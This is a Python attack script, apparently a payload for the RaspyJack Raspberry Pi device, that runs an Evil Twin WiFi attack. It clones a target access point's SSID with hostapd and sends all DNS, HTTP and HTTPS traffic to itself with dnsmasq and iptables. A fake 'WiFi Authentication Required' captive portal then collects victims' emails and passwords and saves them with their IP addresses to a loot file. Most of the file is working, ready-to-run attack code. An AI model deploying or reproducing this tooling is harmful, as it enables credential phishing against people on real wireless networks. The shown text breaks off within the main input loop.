#!/usr/bin/env python3
"""
RaspyJack Payload -- Evil Twin AP
==================================
Author: 7h30th3r0n3

Clone a target AP to lure clients into connecting. Serves a captive
portal that harvests credentials.

Setup / Prerequisites
---------------------
- USB WiFi dongle with monitor mode support (e.g. Alfa AWUS036ACH)
- apt install hostapd dnsmasq-base
- Dongle is auto-detected on wlan1+ (onboard wlan0 is reserved for WebUI)

Steps:
  1) Scan APs on USB WiFi dongle (monitor mode)
  2) User selects target AP
  3) Configure hostapd to clone SSID on the dongle
  4) Start dnsmasq as DHCP server
  5) iptables NAT + DNS redirect to Pi
  6) Serve captive portal page
  7) Capture submitted credentials

Controls:
  OK        -- Select AP / start attack
  UP / DOWN -- Scroll AP list
  LEFT      -- Quick Clone (auto-start with cloned SSID + open auth)
  KEY1      -- Rescan APs
  KEY2      -- Show captured credentials
  KEY3      -- Exit + full cleanup

Loot: /root/Raspyjack/loot/EvilTwin/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import re
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
import rj_theme
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_interface, supports_monitor

_T = rj_theme.EMBER_THEME

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
LOOT_DIR = "/root/Raspyjack/loot/EvilTwin"
os.makedirs(LOOT_DIR, exist_ok=True)

HOSTAPD_CONF = "/tmp/raspyjack_evil_twin_hostapd.conf"
DNSMASQ_CONF = "/tmp/raspyjack_evil_twin_dnsmasq.conf"
PORTAL_PORT = 80
GATEWAY_IP = "10.0.66.1"
DHCP_RANGE_START = "10.0.66.10"
DHCP_RANGE_END = "10.0.66.250"
DHCP_LEASE = "12h"
ROWS_VISIBLE = 7

# ---------------------------------------------------------------------------
# WiFi interface helpers
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _find_usb_wifi():
    """Find the first USB WiFi interface (skip onboard)."""
    try:
        for name in sorted(os.listdir("/sys/class/net")):
            if not name.startswith("wlan"):
                continue
            if not supports_monitor(name):
                continue
            return name
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
ap_list = []           # list of dicts: {ssid, bssid, channel, signal}
scroll_pos = 0
selected_idx = -1
attack_running = False
credentials = []       # list of dicts: {timestamp, email, password}
clients_connected = 0
status_msg = "Idle"
view_mode = "scan"     # scan | attack | creds

# Subprocesses to clean up
_hostapd_proc = None
_dnsmasq_proc = None
_portal_server = None
_iface = None
_original_iface_state = None

# ---------------------------------------------------------------------------
# AP scanning
# ---------------------------------------------------------------------------

def _set_monitor_mode(iface):
    """Put interface into monitor mode."""
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "monitor"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _set_managed_mode(iface):
    """Put interface back into managed mode."""
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "iw", "dev", iface, "set", "type", "managed"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _scan_aps(iface):
    """Scan for APs using iw scan, return list of dicts."""
    _set_managed_mode(iface)
    time.sleep(0.5)
    try:
        result = subprocess.run(
            ["sudo", "iw", "dev", iface, "scan"],
            capture_output=True, text=True, timeout=30,
        )
        raw = result.stdout
    except Exception:
        return []

    aps = []
    current = {}
    for line in raw.splitlines():
        line = line.strip()
        if line.startswith("BSS "):
            if current.get("bssid"):
                aps.append(dict(current))
            match = re.match(r"BSS ([0-9a-f:]+)", line)
            current = {
                "bssid": match.group(1) if match else "??",
                "ssid": "",
                "channel": 0,
                "signal": -100,
            }
        elif line.startswith("SSID:"):
            current["ssid"] = line.split(":", 1)[1].strip()
        elif line.startswith("signal:"):
            try:
                current["signal"] = float(line.split(":")[1].strip().split()[0])
            except (ValueError, IndexError):
                pass
        elif line.startswith("DS Parameter set: channel"):
            try:
                current["channel"] = int(line.rsplit(" ", 1)[1])
            except (ValueError, IndexError):
                pass
    if current.get("bssid"):
        aps.append(dict(current))

    # Filter empty SSIDs, sort by signal
    aps = [a for a in aps if a["ssid"]]
    aps.sort(key=lambda a: a["signal"], reverse=True)
    return aps


def do_scan():
    """Background scan thread."""
    global ap_list, scroll_pos, status_msg, view_mode
    iface = _iface
    if not iface:
        with lock:
            status_msg = "No USB WiFi found"
        return
    with lock:
        status_msg = "Scanning..."
        view_mode = "scan"
    found = _scan_aps(iface)
    with lock:
        ap_list = found
        scroll_pos = 0
        status_msg = f"Found {len(found)} APs"


# ---------------------------------------------------------------------------
# hostapd + dnsmasq configuration
# ---------------------------------------------------------------------------

def _write_hostapd_conf(iface, ssid, channel):
    """Write hostapd configuration to clone the target AP."""
    conf = (
        f"interface={iface}\n"
        f"driver=nl80211\n"
        f"ssid={ssid}\n"
        f"hw_mode=g\n"
        f"channel={channel}\n"
        f"wmm_enabled=0\n"
        f"auth_algs=1\n"
        f"wpa=0\n"
        f"ignore_broadcast_ssid=0\n"
    )
    with open(HOSTAPD_CONF, "w") as f:
        f.write(conf)


def _write_dnsmasq_conf(iface):
    """Write dnsmasq configuration for DHCP and DNS redirect."""
    conf = (
        f"interface={iface}\n"
        f"dhcp-range={DHCP_RANGE_START},{DHCP_RANGE_END},{DHCP_LEASE}\n"
        f"dhcp-option=3,{GATEWAY_IP}\n"
        f"dhcp-option=6,{GATEWAY_IP}\n"
        f"address=/#/{GATEWAY_IP}\n"
        f"no-resolv\n"
        f"log-queries\n"
        f"log-facility=/tmp/raspyjack_evil_twin_dns.log\n"
    )
    with open(DNSMASQ_CONF, "w") as f:
        f.write(conf)


# ---------------------------------------------------------------------------
# Captive portal
# ---------------------------------------------------------------------------

PORTAL_HTML = """<!DOCTYPE html>
<html>
<head><title>WiFi Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial,sans-serif;background:#f0f0f0;display:flex;
justify-content:center;align-items:center;min-height:100vh;margin:0}
.box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px
rgba(0,0,0,.15);max-width:360px;width:90%}
h2{color:#333;margin-top:0}
input{width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;
border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#0066cc;color:#fff;border:none;
border-radius:4px;cursor:pointer;font-size:16px}
button:hover{background:#0055aa}
.note{color:#888;font-size:12px;margin-top:12px}
</style></head>
<body>
<div class="box">
<h2>WiFi Authentication Required</h2>
<p>Please sign in to access the network.</p>
<form method="POST" action="/login">
<input name="email" type="email" placeholder="Email address" required>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>
<p class="note">By signing in you agree to the terms of service.</p>
</div>
</body></html>"""

PORTAL_SUCCESS = """<!DOCTYPE html>
<html><head><title>Connected</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>body{font-family:Arial,sans-serif;text-align:center;padding:60px}
</style></head>
<body><h2>Connected!</h2><p>You are now online.</p></body></html>"""


class PortalHandler(BaseHTTPRequestHandler):
    """HTTP handler for captive portal."""

    def log_message(self, format, *args):
        pass  # suppress console output

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(PORTAL_HTML.encode())

    def do_POST(self):
        content_len = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_len).decode("utf-8", errors="replace")
        params = parse_qs(body)
        email = params.get("email", [""])[0]
        password = params.get("password", [""])[0]

        if email or password:
            cred = {
                "timestamp": datetime.now().isoformat(),
                "email": email,
                "password": password,
                "ip": self.client_address[0],
            }
            with lock:
                credentials.append(cred)
            _save_credential(cred)

        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(PORTAL_SUCCESS.encode())


def _save_credential(cred):
    """Append a credential to the loot file."""
    ts = datetime.now().strftime("%Y%m%d")
    path = os.path.join(LOOT_DIR, f"creds_{ts}.json")
    existing = []
    if os.path.isfile(path):
        try:
            with open(path, "r") as f:
                existing = json.load(f)
        except Exception:
            existing = []
    existing.append(cred)
    with open(path, "w") as f:
        json.dump(existing, f, indent=2)


# ---------------------------------------------------------------------------
# iptables
# ---------------------------------------------------------------------------

def _setup_iptables(iface):
    """Configure NAT and DNS redirect."""
    cmds = [
        ["sudo", "iptables", "-t", "nat", "-F"],
        ["sudo", "iptables", "-F"],
        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", iface, "-p", "tcp", "--dport", "80",
         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:{PORTAL_PORT}"],
        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", iface, "-p", "tcp", "--dport", "443",
         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:{PORTAL_PORT}"],
        ["sudo", "iptables", "-t", "nat", "-A", "PREROUTING",
         "-i", iface, "-p", "udp", "--dport", "53",
         "-j", "DNAT", "--to-destination", f"{GATEWAY_IP}:53"],
        ["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING",
         "-j", "MASQUERADE"],
        ["sudo", "sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"],
    ]
    for cmd in cmds:
        subprocess.run(cmd, capture_output=True, timeout=5)


def _teardown_iptables():
    """Remove iptables rules."""
    cmds = [
        ["sudo", "iptables", "-t", "nat", "-F"],
        ["sudo", "iptables", "-F"],
        ["sudo", "sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"],
    ]
    for cmd in cmds:
        try:
            subprocess.run(cmd, capture_output=True, timeout=5)
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Attack start / stop
# ---------------------------------------------------------------------------

def _start_attack(target_ap):
    """Launch the evil twin: hostapd + dnsmasq + portal."""
    global _hostapd_proc, _dnsmasq_proc, _portal_server
    global attack_running, status_msg, view_mode

    iface = _iface
    if not iface:
        with lock:
            status_msg = "No USB WiFi"
        return

    ssid = target_ap["ssid"]
    channel = target_ap.get("channel", 6) or 6

    with lock:
        status_msg = "Configuring AP..."
        view_mode = "attack"

    # Switch to managed mode and assign IP
    _set_managed_mode(iface)
    time.sleep(0.5)
    subprocess.run(["sudo", "ip", "addr", "flush", "dev", iface],
                   capture_output=True, timeout=5)
    subprocess.run(
        ["sudo", "ip", "addr", "add", f"{GATEWAY_IP}/24", "dev", iface],
        capture_output=True, timeout=5,
    )
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)

    # Write configs
    _write_hostapd_conf(iface, ssid, channel)
    _write_dnsmasq_conf(iface)

    # Kill existing instances
    for proc_name in ("hostapd", "dnsmasq"):
        subprocess.run(["sudo", "killall", proc_name],
                       capture_output=True, timeout=5)
    time.sleep(0.3)

    # Start hostapd
    with lock:
        status_msg = "Starting hostapd..."
    _hostapd_proc = subprocess.Popen(
        ["sudo", "hostapd", HOSTAPD_CONF],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(1.5)

    if _hostapd_proc.poll() is not None:
        stderr = _hostapd_proc.stderr.read().decode(errors="replace")
        with lock:
            status_msg = f"hostapd fail: {stderr[:20]}"
        return

    # Start dnsmasq
    with lock:
        status_msg = "Starting dnsmasq..."
    _dnsmasq_proc = subprocess.Popen(
        ["sudo", "dnsmasq", "-C", DNSMASQ_CONF, "-d"],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
    )
    time.sleep(0.5)

    # Setup iptables
    _setup_iptables(iface)

    # Start captive portal
    with lock:
        status_msg = "Starting portal..."
    try:
        _portal_server = HTTPServer(("0.0.0.0", PORTAL_PORT), PortalHandler)
        _portal_server.timeout = 1
        threading.Thread(target=_portal_serve_loop, daemon=True).start()
    except OSError as exc:
        with lock:
            status_msg = f"Portal err: {str(exc)[:18]}"
        return

    with lock:
        attack_running = True
        status_msg = f"AP '{ssid}' live"


def _portal_serve_loop():
    """Serve portal requests in a loop."""
    while True:
        with lock:
            if not attack_running:
                break
        try:
            if _portal_server:
                _portal_server.handle_request()
        except Exception:
            break


def _stop_attack():
    """Stop all attack processes and clean up."""
    global _hostapd_proc, _dnsmasq_proc, _portal_server
    global attack_running, status_msg

    with lock:
        attack_running = False
        status_msg = "Stopping..."

    # Kill hostapd
    if _hostapd_proc is not None:
        try:
            _hostapd_proc.terminate()
            _hostapd_proc.wait(timeout=3)
        except Exception:
            try:
                _hostapd_proc.kill()
            except Exception:
                pass
        _hostapd_proc = None

    # Kill dnsmasq
    if _dnsmasq_proc is not None:
        try:
            _dnsmasq_proc.terminate()
            _dnsmasq_proc.wait(timeout=3)
        except Exception:
            try:
                _dnsmasq_proc.kill()
            except Exception:
                pass
        _dnsmasq_proc = None

    # Kill any remaining instances
    for proc_name in ("hostapd", "dnsmasq"):
        subprocess.run(["sudo", "killall", "-9", proc_name],
                       capture_output=True, timeout=5)

    # Stop portal
    if _portal_server is not None:
        try:
            _portal_server.server_close()
        except Exception:
            pass
        _portal_server = None

    # Teardown iptables
    _teardown_iptables()

    # Restore interface
    if _iface:
        _set_managed_mode(_iface)
        subprocess.run(["sudo", "ip", "addr", "flush", "dev", _iface],
                       capture_output=True, timeout=5)

    # Clean temp files
    for fpath in (HOSTAPD_CONF, DNSMASQ_CONF):
        try:
            os.remove(fpath)
        except OSError:
            pass

    with lock:
        status_msg = "Stopped"


# ---------------------------------------------------------------------------
# Client counting
# ---------------------------------------------------------------------------

def _count_clients():
    """Count DHCP leases (connected clients)."""
    lease_file = "/var/lib/misc/dnsmasq.leases"
    try:
        if os.path.isfile(lease_file):
            with open(lease_file, "r") as f:
                return len([l for l in f.readlines() if l.strip()])
    except Exception:
        pass
    return 0


# ---------------------------------------------------------------------------
# Drawing (native resolution-adaptive Obsidian Ember)
# ---------------------------------------------------------------------------

_FONTS = rj_theme.load_app_fonts(WIDTH, HEIGHT)


def _sig_pct(dbm):
    try:
        return max(0, min(100, int((float(dbm) + 95.0) * 100.0 / 55.0)))
    except Exception:
        return 0


def _sig_color(dbm):
    try:
        val = float(dbm)
    except Exception:
        return _T["danger"]
    if val >= -55:
        return _T["ok"]
    if val >= -72:
        return _T["warn"]
    return _T["danger"]


def _draw_header(d, title, right_text="", right_pill=""):
    with lock:
        active = attack_running
    return rj_theme.draw_app_header(
        d, WIDTH, title, _FONTS,
        badge="LIVE" if active else "IDLE",
        right_text=right_text,
        right_pill=right_pill,
    )


def _draw_footer(d, text, right_text=""):
    return rj_theme.draw_app_footer(d, WIDTH, HEIGHT, text, _FONTS, right_text=right_text)


def draw_scan_view():
    """Draw AP scan results."""
    wide = _FONTS["wide"]
    large = _FONTS["large"]
    img = Image.new("RGB", (WIDTH, HEIGHT), _T["bg_base"])
    d = ImageDraw.Draw(img)

    with lock:
        aps = list(ap_list)
        sc = scroll_pos
        msg = status_msg
        cred_count = len(credentials)

    hdr_h = _draw_header(d, "EVIL TWIN", right_text=msg if wide else "", right_pill=f"{len(aps)} APs")
    ftr_h = _draw_footer(
        d,
        "Up/Dn:Nav  OK:Launch  Left:QuickClone  K1:Scan  K2:Creds  K3:Exit" if wide else "OK:Go L:Cln K1:Sc K3:X",
        right_text=f"Creds:{cred_count}" if large else "",
    )

    pad = 8 if large else (4 if wide else 2)
    y_top = hdr_h + pad
    y_bot = HEIGHT - ftr_h - pad

    if not wide:
        d.text((pad + 2, y_top), rj_theme.truncate_text(d, msg, WIDTH - pad * 2 - 4, _FONTS["sub"]), font=_FONTS["sub"], fill=_T["warn"])
        y_top += 13 if HEIGHT < 200 else 16

    if not aps:
        rj_theme.draw_status_card(
            d, WIDTH, HEIGHT, "No Access Points",
            sub=msg if msg != "Idle" else "Press KEY1 / F1 to scan nearby APs",
            kind="info", foot="K1: Scan   K3: Exit", fonts=_FONTS,
        )
        LCD.LCD_ShowImage(img, 0, 0)
        return

    split = WIDTH >= 480
    lx0 = pad
    lx1 = int(WIDTH * 0.63) - pad // 2 if split else WIDTH - pad - (5 if len(aps) > 5 else 0)

    row_h = 28 if large else (22 if wide else (20 if HEIGHT >= 200 else 13))
    vis = max(1, (y_bot - y_top) // row_h)
    start = max(0, min(sc - vis // 2, max(0, len(aps) - vis)))

    for i in range(vis):
        idx = start + i
        if idx >= len(aps):
            break
        ap = aps[idx]
        y = y_top + i * row_h
        is_cur = idx == sc
        is_sel = idx == selected_idx
        if is_cur:
            rj_theme.draw_card(
                d, (lx0, y, lx1, y + row_h - 2),
                fill=_T["select_bg"], outline=_T["border_accent"],
                radius=4 if wide else 2, accent_left=_T["accent"], accent_width=3 if wide else 2,
            )
        elif i % 2 == 1 and wide:
            d.rectangle((lx0, y, lx1, y + row_h - 2), fill=_T["bg_surface"])

        ty = y + max(1, (row_h - (14 if large else (11 if wide else 9))) // 2)
        rx = lx1 - (8 if wide else 3)
        sig = int(ap["signal"])
        scol = _sig_color(sig)

        sig_h = 12 if large else (10 if wide else 8)
        sig_w = max(12, (sig_h // 5) * 4 + 8)
        rj_theme.draw_signal_bars(d, rx - sig_w, y + max(1, (row_h - sig_h) // 2), sig_h, _sig_pct(sig), active_color=scol)
        rx -= sig_w + (6 if wide else 3)

        db_txt = f"{sig}dB"
        dw = rj_theme.measure_text(_FONTS["sub"], db_txt, d)[2]
        d.text((rx - dw, ty + (1 if wide else 0)), db_txt, font=_FONTS["sub"], fill=_T["text_muted"])
        rx -= dw + (6 if wide else 3)

        if wide and ap.get("channel"):
            ch_txt = f"CH{ap['channel']}"
            cw_p = rj_theme.measure_text(_FONTS["badge"], ch_txt, d)[2] + 8
            pw, _ = rj_theme.draw_pill(
                d, rx - cw_p, y + max(1, (row_h - 15) // 2),
                ch_txt, _FONTS["badge"], bg=_T["bg_elevated"], fg=_T["accent_bright"], outline=None, pad_x=4, pad_y=1,
            )
            rx -= pw + 6

        tx = lx0 + (10 if wide else 4)
        fnt = _FONTS["body_bold"] if (is_cur and wide) else (_FONTS["body"] if wide else _FONTS["sub"])
        col = _T["ok"] if is_sel else (_T["text_bright"] if is_cur else _T["text_primary"])
        d.text((tx, ty), rj_theme.truncate_text(d, ap["ssid"], max(20, rx - tx - 2), fnt), font=fnt, fill=col)

    if len(aps) > vis:
        rj_theme.draw_scrollbar(d, lx1 + 2 if split else WIDTH - 4, y_top, y_bot, start, vis, len(aps), width=3)

    if split and 0 <= sc < len(aps):
        cur = aps[sc]
        px0 = lx1 + 10
        rj_theme.draw_card(
            d, (px0, y_top, WIDTH - pad, y_bot),
            fill=_T["bg_surface"], outline=_T["border_subtle"],
            radius=8, accent_left=_T["danger"], accent_width=4,
        )
        dx = px0 + 12
        dy = y_top + 12
        dmw = WIDTH - pad - dx - 8
        d.text((dx, dy), "TARGET PREVIEW", font=_FONTS["badge"], fill=_T["danger"])
        dy += 20
        d.text((dx, dy), rj_theme.truncate_text(d, cur["ssid"], dmw, _FONTS["title"]), font=_FONTS["title"], fill=_T["text_bright"])
        dy += 22
        d.text((dx, dy), cur["bssid"].upper(), font=_FONTS["mono"], fill=_T["text_muted"])
        dy += 22
        d.line([(dx, dy), (WIDTH - pad - 10, dy)], fill=_T["border_subtle"])
        dy += 12
        for k, v, c in [
            ("Channel", f"Ch {cur.get('channel') or 6}", _T["accent_bright"]),
            ("Signal", f"{int(cur['signal'])} dBm", _sig_color(cur["signal"])),
            ("Gateway", f"{GATEWAY_IP}:{PORTAL_PORT}", _T["text_primary"]),
            ("Interface", _iface or "N/A", _T["text_muted"]),
            ("Harvested", f"{cred_count} creds", _T["ok"] if cred_count else _T["text_muted"]),
        ]:
            d.text((dx, dy), f"{k}:", font=_FONTS["sub"], fill=_T["text_muted"])
            d.text((dx + 72, dy), rj_theme.truncate_text(d, v, dmw - 72, _FONTS["body_bold"]), font=_FONTS["body_bold"], fill=c)
            dy += 22

    LCD.LCD_ShowImage(img, 0, 0)


def draw_attack_view():
    """Draw attack status."""
    wide = _FONTS["wide"]
    large = _FONTS["large"]
    img = Image.new("RGB", (WIDTH, HEIGHT), _T["bg_base"])
    d = ImageDraw.Draw(img)

    with lock:
        msg = status_msg
        cred_count = len(credentials)
        running = attack_running
        last_cred = dict(credentials[-1]) if credentials else None

    num_clients = _count_clients()

    hdr_h = _draw_header(d, "EVIL TWIN AP", right_text=_iface or "", right_pill=f"{GATEWAY_IP}:{PORTAL_PORT}")
    footer = "OK:Stop  K2:Creds  K3:Exit" if (running and wide) else ("K2:Creds K3:Exit" if running else "OK:Start K3:Exit")
    ftr_h = _draw_footer(d, footer, right_text=f"{cred_count} creds" if large else "")

    pad = 10 if large else (5 if wide else 3)
    y0 = hdr_h + pad
    y1 = HEIGHT - ftr_h - pad

    if WIDTH >= 480:
        # 3 KPI cards across top
        kpi_h = 72
        gap = 10
        tw = (WIDTH - pad * 2 - gap * 2) // 3
        kpis = [
            ("ROGUE AP STATUS", "LIVE" if running else "STOPPED", _T["ok"] if running else _T["danger"]),
            ("CONNECTED CLIENTS", str(num_clients), _T["accent_bright"]),
            ("HARVESTED CREDS", str(cred_count), _T["warn"] if cred_count else _T["text_muted"]),
        ]
        for idx_k, (lbl, val, acc) in enumerate(kpis):
            kx = pad + idx_k * (tw + gap)
            rj_theme.draw_card(
                draw=d, box=(kx, y0, kx + tw, y0 + kpi_h),
                fill=_T["bg_surface"], outline=_T["border_subtle"],
                radius=8, accent_left=acc, accent_width=4,
            )
            d.text((kx + 14, y0 + 12), lbl, font=_FONTS["badge"], fill=_T["text_muted"])
            d.text((kx + 14, y0 + 36), val, font=_FONTS["title"], fill=acc)

        # Bottom detail card
        by0 = y0 + kpi_h + pad
        rj_theme.draw_card(
            d, (pad, by0, WIDTH - pad, y1),
            fill=_T["bg_surface"], outline=_T["border_accent"] if running else _T["border_subtle"],
            radius=8, accent_left=_T["accent"], accent_width=4,
        )
        dx = pad + 16
        dy = by0 + 14
        dmw = WIDTH - pad * 2 - 24
        d.text((dx, dy), rj_theme.truncate_text(d, msg, dmw, _FONTS["title"]), font=_FONTS["title"], fill=_T["ok"] if running else _T["danger"])
        dy += 28
        d.text((dx, dy), f"Captive Portal: http://{GATEWAY_IP}:{PORTAL_PORT}   DHCP: {DHCP_RANGE_START} - {DHCP_RANGE_END}", font=_FONTS["body"], fill=_T["text_muted"])
        dy += 26
        if last_cred:
            rj_theme.draw_card(
                d, (dx, dy, WIDTH - pad - 14, min(y1 - 10, dy + 62)),
                fill=_T["bg_elevated"], outline=_T["warn"], radius=6, accent_left=_T["warn"], accent_width=3,
            )
            d.text((dx + 12, dy + 8), "LATEST CREDENTIAL CAPTURE", font=_FONTS["badge"], fill=_T["warn"])
            d.text((dx + 12, dy + 28), rj_theme.truncate_text(d, f"{last_cred['email']}   |   {last_cred['password']}   ({last_cred.get('ip', '')})", dmw - 24, _FONTS["body_bold"]), font=_FONTS["body_bold"], fill=_T["text_bright"])
        else:
            d.text((dx, dy + 10), "Waiting for client portal login submissions...", font=_FONTS["body"], fill=_T["text_dim"])
    else:
        rj_theme.draw_card(
            d, (pad, y0, WIDTH - pad, y1),
            fill=_T["bg_surface"], outline=_T["ok"] if running else _T["border_subtle"],
            radius=5 if wide else 3, accent_left=_T["ok"] if running else _T["danger"], accent_width=3 if wide else 2,
        )
        tx = pad + (10 if wide else 6)
        mw = WIDTH - pad - tx - 4
        y = y0 + (8 if wide else 5)
        step = 18 if wide else (16 if HEIGHT >= 200 else 13)
        d.text((tx, y), rj_theme.truncate_text(d, msg, mw, _FONTS["body_bold"]), font=_FONTS["body_bold"], fill=_T["ok"] if running else _T["danger"])
        y += step
        d.text((tx, y), f"Clients: {num_clients}   Creds: {cred_count}" if wide else f"Clients: {num_clients}", font=_FONTS["body"], fill=_T["text_bright"])
        y += step
        if not wide:
            d.text((tx, y), f"Creds: {cred_count}", font=_FONTS["body"], fill=_T["warn"])
            y += step
        d.text((tx, y), f"Portal: {GATEWAY_IP}:{PORTAL_PORT}", font=_FONTS["sub"], fill=_T["text_muted"])
        y += step
        if last_cred and y + 10 <= y1:
            d.text((tx, y), rj_theme.truncate_text(d, f"Last: {last_cred['email']}", mw, _FONTS["sub"]), font=_FONTS["sub"], fill=_T["accent_bright"])

    LCD.LCD_ShowImage(img, 0, 0)


def draw_creds_view():
    """Draw captured credentials."""
    wide = _FONTS["wide"]
    large = _FONTS["large"]
    img = Image.new("RGB", (WIDTH, HEIGHT), _T["bg_base"])
    d = ImageDraw.Draw(img)

    with lock:
        creds = list(credentials)
        sc = scroll_pos

    hdr_h = _draw_header(d, "CAPTURED CREDS", right_pill=f"{len(creds)} TOTAL")
    ftr_h = _draw_footer(d, "Up/Dn:Scroll   KEY3 / Esc:Back" if wide else f"{len(creds)} total  K3:Back")

    pad = 8 if large else (4 if wide else 2)
    y_top = hdr_h + pad
    y_bot = HEIGHT - ftr_h - pad

    if not creds:
        rj_theme.draw_status_card(
            d, WIDTH, HEIGHT, "No Credentials Yet",
            sub="Submitted captive portal logins appear here",
            kind="info", foot="K3: Back", fonts=_FONTS,
        )
    else:
        card_h = 48 if large else (34 if wide else 22)
        vis = max(1, (y_bot - y_top) // card_h)
        start = max(0, min(sc, max(0, len(creds) - vis)))
        for i in range(vis):
            idx = start + i
            if idx >= len(creds):
                break
            cred = creds[idx]
            y = y_top + i * card_h
            rj_theme.draw_card(
                d, (pad, y, WIDTH - pad - (5 if len(creds) > vis else 0), y + card_h - 3),
                fill=_T["bg_surface"], outline=_T["border_subtle"],
                radius=5 if wide else 3, accent_left=_T["warn"], accent_width=3 if wide else 2,
            )
            tx = pad + (10 if wide else 5)
            mw = WIDTH - pad * 2 - (18 if wide else 10)
            email_txt = cred.get("email", "")
            pw_txt = cred.get("password", "")
            ip_txt = cred.get("ip", "")
            ts_txt = str(cred.get("timestamp", ""))[11:19]
            if wide:
                d.text((tx, y + (6 if large else 3)), rj_theme.truncate_text(d, email_txt, mw - 110, _FONTS["body_bold"]), font=_FONTS["body_bold"], fill=_T["accent_bright"])
                meta_s = f"{ip_txt}  {ts_txt}".strip()
                mw_meta = rj_theme.measure_text(_FONTS["sub"], meta_s, d)[2]
                d.text((WIDTH - pad - mw_meta - 12, y + (7 if large else 4)), meta_s, font=_FONTS["sub"], fill=_T["text_muted"])
                d.text((tx, y + (25 if large else 17)), rj_theme.truncate_text(d, f"PASS: {pw_txt}", mw, _FONTS["mono"]), font=_FONTS["mono"], fill=_T["warn"])
            else:
                d.text((tx, y + 1), rj_theme.truncate_text(d, email_txt, mw, _FONTS["sub"]), font=_FONTS["sub"], fill=_T["accent_bright"])
                d.text((tx, y + 10), rj_theme.truncate_text(d, pw_txt, mw, _FONTS["sub"]), font=_FONTS["sub"], fill=_T["warn"])
        if len(creds) > vis:
            rj_theme.draw_scrollbar(d, WIDTH - 5, y_top, y_bot, start, vis, len(creds), width=3)

    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _iface, scroll_pos, selected_idx, view_mode, status_msg

    _iface = select_interface(LCD, font, PINS, GPIO, iface_type="wifi")
    if not _iface:
        GPIO.cleanup()
        return 1

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), _T["bg_base"])
    d = ImageDraw.Draw(img)
    _draw_header(d, "EVIL TWIN AP", right_pill=_iface or "NONE")
    rj_theme.draw_status_card(
        d, WIDTH, HEIGHT, "Evil Twin Captive Portal",
        sub=f"Iface: {_iface or 'NONE'}  |  GW: {GATEWAY_IP}",
        kind="warn",
        foot="K1:Scan  OK:Launch  K2:Creds  K3:Exit",
        fonts=_FONTS,
    )
    LCD.LCD_ShowImage(img, 0, 0)
    time.sleep(0.5)

    try:
        while True:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                if view_mode == "creds":
                    with lock:
                        view_mode = "attack" if attack_running else "scan"
                        scroll_pos = 0
                    time.sleep(0.25)
                    continue
                break

            if view_mode == "scan":
                if btn == "KEY1":
                    threading.Thread(target=do_scan, daemon=True).start()
                    time.sleep(0.3)
                elif btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        scroll_pos = min(max(0, len(ap_list) - 1), scroll_pos + 1)
                    time.sleep(0.15)
                elif btn == "OK":
                    with lock:
                        if ap_list and scroll_pos < len(ap_list):
                            target = ap_list[scroll_pos]
                    if ap_list:
                        threading.Thread(
                            target=_start_attack, args=(target,), daemon=True,
                        ).start()
                    time.sleep(0.3)
